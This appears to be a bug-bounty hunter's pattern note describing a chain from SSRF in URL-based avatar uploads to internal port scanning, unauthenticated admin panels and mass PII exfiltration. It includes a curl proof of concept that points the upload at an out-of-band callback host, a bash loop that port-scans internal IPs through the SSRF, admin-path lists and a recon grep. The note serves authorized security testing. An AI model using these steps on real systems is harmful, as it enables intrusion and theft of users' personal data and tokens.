---
type: pattern
name: SSRF via URL-based Upload Chain
description: Profile-picture / avatar / media upload takes a URL instead of a file → SSRF → internal-network recon → unauthenticated admin panel / debug endpoint → mass PII exfil
last_updated: 2026-04-22
seen_in:
  - external_writeup_hacklido_1493_sagar_seagate_2026
tags:
  - bb-pattern
---

# Pattern — SSRF via URL-based Upload Chain

> Source: [[WU-009-from-image-upload-to-admin-panel-simple-ssrf-pii-d|Writeup #9 — From Image Upload to Admin Panel (Sagar Dhoot)]]

## The chain

```
Avatar upload accepts URL (not file)
  ↓
SSRF canary: replace URL with Burp Collaborator
  ↓
Multiple internal IPs callback (image processor, CDN cache, AV scanner)
  ↓
Port-scan each unique internal IP
  ↓
Unauthenticated admin panel on random port
  ↓
"Test push notification" / "Debug user lookup" tool
  ↓
Return full user PII (emails, OAuth tokens, device tokens, wallet, activity)
```

**Impact**: Critical — mass PII exfil from anonymous starting point.

---

## The SSRF canary (fastest test)

During any onboarding flow, during profile-picture upload, check Burp request:

✅ **Red flag**: request body contains a **URL** instead of raw file bytes / multipart `Content-Disposition: form-data; name="file"`
```json
{"profile_picture_url": "https://cdn.myapp.com/tmp/xyz.jpg"}
```
(or sometimes buried in `upload_token_url`, `avatar_source`, `imageUri`, `imported_image`)

❌ **Safe**: direct multipart upload or base64 blob
```
Content-Disposition: form-data; name="file"; filename="..."
Content-Type: image/jpeg

<binary>
```

## PoC — single curl

```bash
# Replace the image URL with your Burp Collaborator endpoint
curl -X POST https://target.com/api/user/avatar \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"profile_picture_url": "https://abc123.oastify.com/ssrf-test"}'
```

Then watch your collaborator dashboard. Key signals:

| Signal | Interpretation |
|--------|----------------|
| **0 callbacks** | Not SSRF — backend doesn't actually fetch |
| **1 callback, public IP, generic UA** | SSRF but only 1 layer; limited pivot |
| **Multiple callbacks, different IPs/UAs** | 🔥 Multi-stage processing — image processor + CDN + AV scanner + thumbnailer — each is a separate pivot |
| **Callback from RFC-1918 range** (10.x/172.16/192.168) | 🔥🔥 Internal network reachable — document IPs immediately |

## Post-SSRF pivot workflow

1. **Log every callback** — IP, user-agent, timestamp. Distinct UAs suggest distinct services.
2. **Port-scan each callback IP** (only from within the SSRF — if the target forbids scanning, use the SSRF itself to probe):
   ```bash
   # Use SSRF payload to probe each internal IP port
   for port in 80 443 3000 3001 4000 5000 5601 6379 8000 8080 8443 8888 9000 9090 9200; do
     curl -X POST https://target.com/api/user/avatar \
       -d "{\"profile_picture_url\":\"http://${internal_ip}:${port}/\"}"
     # Check server response for error differential (timeout/refused = closed, 200/301/302 = open)
   done
   ```
3. **Probe paths** once open port found — common admin paths:
   `/admin`, `/dashboard`, `/internal`, `/debug`, `/metrics`, `/api/admin`, `/graphql`, `/console`, `/_health`
4. **If admin panel** — look for "test" / "debug" features that take arbitrary IDs:
   - "Test push notification" / "Test SMS" / "Test email" → returns user record
   - "Impersonate user" / "Switch user" → auth bypass
   - "Debug: look up user" / "User inspector" → PII dump
5. **Stop when impact is undeniable** (not before). Report with full chain evidence.

---

## Why this pattern is rare but devastating

- Most SSRFs are reported in isolation ("I made server fetch my Collaborator, P4 done").
- The **real** severity comes from following every callback and port-scanning.
- "Hidden admin panels" are common in internal networks because developers assume `172.16.*` is private.
- Debug endpoints with arbitrary `user_id` input are common in admin panels because they're for ops/support staff.
- The combination (SSRF → internal service → unauth admin → PII leak) is not in any OWASP top-10 list and is typically missed by scanners.

---

## Why upload-via-URL is common in modern apps

Backends prefer URL-based upload for these reasons — and each reason is a footgun:

| Architecture reason | Why it's a footgun |
|---------------------|--------------------|
| CDN pre-upload (user uploads to S3 → backend gets URL) | Backend blindly GETs the URL without validation |
| OAuth avatar sync (e.g. `profile.google.com/photo`) | Accepts arbitrary `https://` which is blanket SSRF |
| Image optimization pipeline (thumbnailer fetches from URL) | Multi-hop processing expands blast radius |
| "Import from URL" UI convenience feature | Often not reviewed as input surface |
| Mobile app uploads to signed URL first | Server-side fetch implements AV scan or transcoding |

## Pre-hunt detection in bbflow

Add to `hunters/hunt-url-upload-ssrf.sh` (TODO):
```bash
# Find candidate endpoints from existing recon
grep -E '(avatar|profile.*picture|picture.*upload|photo.*url|image.*url|upload.*url|file.*url|document.*url|url.*upload|url.*image|fetch.*url|import.*url)' \
  workshop/*/osmedeus/*/archive/archive-urls-*.txt \
  workshop/*/crawl.txt
```

---

## See also

- [[Pattern - SSRF Filter Bypass]] — once you have SSRF, bypass techniques for IPv4-mapped IPv6, parser confusion, redirect chain
- [[External Writeups - 2026 Collection]] — original writeup entry
- [[Playbook - API Attack Surface]] — upload endpoints checklist

## Related

- [[Pattern - SSRF Filter Bypass]]
